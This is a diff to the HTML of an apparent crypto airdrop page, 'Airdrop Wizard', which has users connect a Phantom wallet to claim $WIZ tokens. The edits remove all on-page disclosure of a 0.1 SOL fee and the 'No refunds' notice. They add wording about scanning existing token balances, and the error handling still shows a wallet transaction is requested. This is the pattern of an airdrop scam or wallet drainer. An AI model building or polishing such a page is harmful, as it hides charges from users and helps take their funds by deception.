@@ -83,14 +83,6 @@
       text-shadow: 0 0 20px var(--neon-pink);
     }
 
-    .amount {
-      font-size: 2.4rem;
-      color: #ffff00;
-      text-align: center;
-      margin: 15px 0 25px;
-      text-shadow: 0 0 15px #ffff00;
-    }
-
     button {
       width: 100%;
       background: linear-gradient(45deg, #ff00ff, #00ffff);
@@ -153,10 +145,9 @@
 
     <div class="card">
       <h1>CHECK FOR AIRDROPS</h1>
-      <div class="amount">0.1 SOL FEE • INSTANT CLAIM</div>
-      <p style="text-align:center; font-size:1.6rem; margin-bottom:25px;">
-        Connect your Phantom wallet and check for your $WIZ airdrop.<br>
-        A small 0.1 SOL transaction is required to verify and claim.
+      <p style="text-align:center; font-size:1.6rem; margin-bottom:30px;">
+        Connect your Phantom wallet to scan for pre-existing token balances<br>
+        and claim your $WIZ airdrop from the neon grid.
       </p>
 
       <button id="connectBtn">CONNECT PHANTOM WALLET</button>
@@ -166,8 +157,7 @@
     </div>
 
     <footer>
-      © 2026 Airdrop Wizard • $WIZ TOKEN<br>
-      0.1 SOL verification fee • No refunds
+      © 2026 Airdrop Wizard • $WIZ TOKEN
     </footer>
   </div>
 
@@ -211,7 +201,7 @@
         return;
       }
 
-      statusDiv.innerHTML = `<span style="color:#ffff00;">Checking the neon grid for your airdrop...</span>`;
+      statusDiv.innerHTML = `<span style="color:#ffff00;">Scanning the neon grid for your airdrops...</span>`;
 
       try {
         const connection = new solanaWeb3.Connection(
@@ -243,12 +233,12 @@
         `;
 
         setTimeout(() => {
-          statusDiv.innerHTML += `<br><span style="color:#ffff00;">Your $WIZ tokens are being airdropped. Welcome to the neon grid!</span>`;
+          statusDiv.innerHTML += `<br><span style="color:#ffff00;">Your $WIZ tokens are being delivered. Welcome to the neon grid!</span>`;
         }, 2500);
 
       } catch (err) {
         console.error(err);
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">Transaction rejected.<br>Please try again or check your balance.</span>`;
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">Transaction rejected.<br>Please try again.</span>`;
       }
     }
 
